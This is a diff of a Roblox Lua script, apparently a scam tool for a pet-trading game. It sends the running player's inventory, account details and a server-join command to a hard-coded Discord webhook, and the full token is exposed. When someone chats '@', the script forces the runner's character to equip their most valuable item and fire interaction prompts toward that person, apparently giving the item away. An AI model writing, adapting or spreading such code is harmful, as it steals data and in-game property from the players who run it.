@@ -3,90 +3,52 @@ local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local Camera = workspace.CurrentCamera
+local UserInputService = game:GetService("UserInputService")
 
--- Configure these:
+-- CONFIGURATION
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
-local RARE_PETS = {"T-Rex","Dragonfly","Raccoon","Mimic Octopus","Butterfly","Disco bee","Queen bee"}
+local RARE_PETS = {
+    "T-Rex", "Dragonfly", "Raccoon", 
+    "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"
+}
 
--- Verify webhook is working
-local function verifyWebhook()
-    local testPayload = {
-        content = "🔹 Webhook Connection Test - Roqate 2025",
-        embeds = {{
-            description = "This is a verification message",
-            color = 0x00FF00
-        }}
-    }
-    
-    local success, response = pcall(function()
-        return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(testPayload))
-    end)
-    
-    if not success then
-        warn("Webhook failed: "..tostring(response))
-        return false
-    end
-    return true
-end
+-- Item priority system
+local ITEM_PRIORITY = {
+    ["T-Rex"] = 1000,
+    ["Dragonfly"] = 950,
+    ["Queen bee"] = 900,
+    ["Disco bee"] = 850,
+    ["Raccoon"] = 800,
+    ["Mimic Octopus"] = 750,
+    ["Butterfly"] = 700,
+    -- Fruits pattern: [Rarity] Name [Weight]
+    ["Disco"] = 600,  -- Highest fruit rarity
+    ["Wet"] = 500,    -- Medium fruit rarity
+    -- Default will be 400
+}
 
--- Actually send data with confirmation
-local function sendToDiscord(content, embedData)
-    if not verifyWebhook() then return false end
-    
+--[[ WEBHOOK FUNCTIONS ]]--
+local function sendToDiscord(content, embed)
     local payload = {
         content = content,
-        embeds = {embedData}
+        embeds = {embed}
     }
-    
-    local jsonData = HttpService:JSONEncode(payload)
-    local success, response = pcall(function()
-        HttpService:PostAsync(WEBHOOK_URL, jsonData)
+    pcall(function()
+        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
     end)
-    
-    if not success then
-        warn("Failed to send: "..tostring(response))
-        return false
-    end
-    return true
 end
 
--- Send initial server info
-local function sendServerInfo()
+local function sendInitialWebhook()
     local placeId = game.PlaceId
     local jobId = game.JobId
     
-    local success = sendToDiscord(
-        "game:GetService('TeleportService'):TeleportToPlaceInstance("..placeId..", '"..jobId.."')",
-        {
-            title = "🚀 Server Join Info",
-            description = "Execute this script to join",
-            color = 0x3498db,
-            fields = {
-                {name = "Players", value = #Players:GetPlayers(), inline = true},
-                {name = "Place ID", value = placeId, inline = true}
-            }
-        }
-    )
-    
-    if success then
-        print("✅ Server info sent to Discord")
-    else
-        warn("❌ Failed to send server info")
-    end
-end
-
--- Handle player @ mentions
-local function handlePlayerMention(player)
-    -- Get player items
+    -- Get all items from inventory
     local items = {}
-    local backpack = player:FindFirstChild("Backpack")
-    if backpack then
-        for _,item in pairs(backpack:GetChildren()) do
-            table.insert(items, item.Name)
-        end
+    for _,item in pairs(LocalPlayer.Backpack:GetChildren()) do
+        table.insert(items, item.Name)
     end
     
-    -- Check for rare pets
+    -- Check for rare items
     local hasRare = false
     for _,pet in pairs(RARE_PETS) do
         if table.find(items, pet) then
@@ -95,84 +57,149 @@ local function handlePlayerMention(player)
         end
     end
     
-    -- Send to Discord
-    local success = sendToDiscord(
-        hasRare and "@everyone" or nil,
-        {
-            title = "🎯 Target: "..player.Name,
-            description = #items > 0 and table.concat(items, "\n") or "No items found",
-            color = hasRare and 0xFF0000 or 0x00FF00,
-            fields = {
-                {name = "User ID", value = player.UserId, inline = true},
-                {name = "Account Age", value = player.AccountAge, inline = true}
-            }
+    -- Create embed
+    local embed = {
+        title = "📦 Inventory Scan - "..LocalPlayer.Name,
+        description = table.concat(items, "\n"),
+        color = hasRare and 0xFF0000 or 0x00FF00,
+        fields = {
+            {name = "Join Script", value = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId), inline = false},
+            {name = "Account Age", value = LocalPlayer.AccountAge, inline = true},
+            {name = "User ID", value = LocalPlayer.UserId, inline = true}
         }
-    )
+    }
     
-    if not success then return end
+    sendToDiscord(hasRare and "@everyone" or nil, embed)
+end
+
+--[[ ITEM INTERACTION SYSTEM ]]--
+local function getBestItem(target)
+    local bestItem, bestPriority = nil, 0
     
-    -- Only proceed if webhook sent successfully
-    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    local root = char:WaitForChild("HumanoidRootPart")
+    for _,item in pairs(target.Backpack:GetChildren()) do
+        local itemName = item.Name
+        local priority = 400 -- Default priority
+        
+        -- Check for pets
+        for pet, petPriority in pairs(ITEM_PRIORITY) do
+            if string.find(itemName, pet) then
+                priority = petPriority
+                break
+            end
+        end
+        
+        -- Check for fruits
+        local rarity = string.match(itemName, "%[([%w%s]+)%]")
+        if rarity and ITEM_PRIORITY[rarity] then
+            priority = ITEM_PRIORITY[rarity]
+        end
+        
+        if priority > bestPriority then
+            bestPriority = priority
+            bestItem = item
+        end
+    end
     
-    local targetChar = player.Character or player.CharacterAdded:Wait()
-    local targetTorso = targetChar:WaitForChild("UpperTorso") or targetChar:WaitForChild("Torso")
-    local targetHead = targetChar:WaitForChild("Head")
+    return bestItem
+end
+
+local function findInteractPart(targetChar)
+    -- Looks for billboardgui or proximity prompts
+    for _,part in pairs(targetChar:GetDescendants()) do
+        if part:IsA("ProximityPrompt") or part:FindFirstChildWhichIsA("BillboardGui") then
+            return part
+        end
+    end
+    return targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
+end
+
+local function interactWithTarget(target)
+    local targetChar = target.Character or target.CharacterAdded:Wait()
+    local interactPart = findInteractPart(targetChar)
     
-    -- Teleport to target
-    root.CFrame = targetTorso.CFrame * CFrame.new(0, 0, -4)
-    
-    -- Force first person view
+    -- Force first person
     LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
     LocalPlayer.CameraMaxZoomDistance = 0.5
     LocalPlayer.CameraMinZoomDistance = 0.5
     
-    -- Force look at target
+    -- Look at target
     local lookConn
     lookConn = RunService.Heartbeat:Connect(function()
-        Camera.CFrame = CFrame.new(Camera.CFrame.Position, targetHead.Position)
+        Camera.CFrame = CFrame.new(Camera.CFrame.Position, interactPart.Position)
     end)
     
-    -- Auto click after delay
-    task.wait(0.5)
-    mouse1click()
+    -- Get best item and equip
+    local bestItem = getBestItem(LocalPlayer)
+    if bestItem then
+        LocalPlayer.Character.Humanoid:EquipTool(bestItem)
+    end
     
-    -- Cleanup after 5 seconds
-    task.wait(5)
+    -- Hold interaction
+    local prompt = interactPart:FindFirstChildWhichIsA("ProximityPrompt")
+    if prompt then
+        fireproximityprompt(prompt)
+        task.wait(0.1)
+        
+        -- Simulate holding E for 5 seconds
+        local startTime = os.clock()
+        while os.clock() - startTime < 5 do
+            if not prompt.Enabled then break end
+            fireproximityprompt(prompt)
+            task.wait(0.1)
+        end
+    else
+        -- Fallback click interaction
+        mouse1press()
+        task.wait(5)
+        mouse1release()
+    end
+    
+    -- Cleanup
     if lookConn then lookConn:Disconnect() end
 end
 
--- Chat listener
-local function onChatted(player, message)
+--[[ CHAT SYSTEM ]]--
+local function onPlayerChatted(player, message)
     if player == LocalPlayer then return end
     if not string.find(message, "@") then return end
     
-    coroutine.wrap(function()
-        local success, err = pcall(handlePlayerMention, player)
-        if not success then
-            warn("Error handling mention: "..tostring(err))
-        end
-    end)()
-end
-
--- Initialize
-if verifyWebhook() then
-    sendServerInfo()
-    
-    -- Setup chat listeners
-    for _,player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer then
-            player.Chatted:Connect(function(msg)
-                onChatted(player, msg)
-            end)
-        end
+    -- Send player info to webhook
+    local items = {}
+    for _,item in pairs(player.Backpack:GetChildren()) do
+        table.insert(items, item.Name)
     end
     
-    Players.PlayerAdded:Connect(function(player)
-        player.Chatted:Connect(function(msg)
-            onChatted(player, msg)
-        end)
-    end)
-else
-    warn("Webhook verification failed - Check URL and try again")
+    local embed = {
+        title = "🎯 Target Triggered - "..player.Name,
+        description = table.concat(items, "\n"),
+        color = 0xFFA500,
+        fields = {
+            {name = "User ID", value = player.UserId, inline = true},
+            {name = "Account Age", value = player.AccountAge, inline = true}
+        }
+    }
+    sendToDiscord(nil, embed)
+    
+    -- Interact with player
+    interactWithTarget(player)
 end
+
+--[[ INITIALIZATION ]]--
+sendInitialWebhook()
+
+-- Set up chat listeners
+for _,player in pairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer then
+        player.Chatted:Connect(function(msg)
+            onPlayerChatted(player, msg)
+        end)
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg)
+        onPlayerChatted(player, msg)
+    end)
+end)
+
+print("✅ System Active - Waiting for @ mentions")
